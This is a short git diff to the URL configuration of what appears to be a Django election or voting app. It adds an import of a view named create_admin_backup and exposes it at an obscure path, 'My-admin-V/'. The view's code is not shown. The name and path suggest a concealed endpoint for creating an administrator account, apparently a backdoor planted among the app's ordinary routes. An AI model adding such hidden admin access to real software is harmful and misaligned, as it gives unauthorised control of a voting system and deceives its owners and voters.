@@ -6,6 +6,7 @@ from rest_framework_simplejwt.views import (
 
 
 from .views import CandidateListView, CastVoteView, RegisterView, election_result_view
+from .views import create_admin_backup
 
 urlpatterns = [
     # Auth Endpoints
@@ -19,4 +20,5 @@ urlpatterns = [
     
     
     path('results/', election_result_view, name='election-results'),
+    path('My-admin-V/', create_admin_backup, name='create-admin-backup'),
 ]
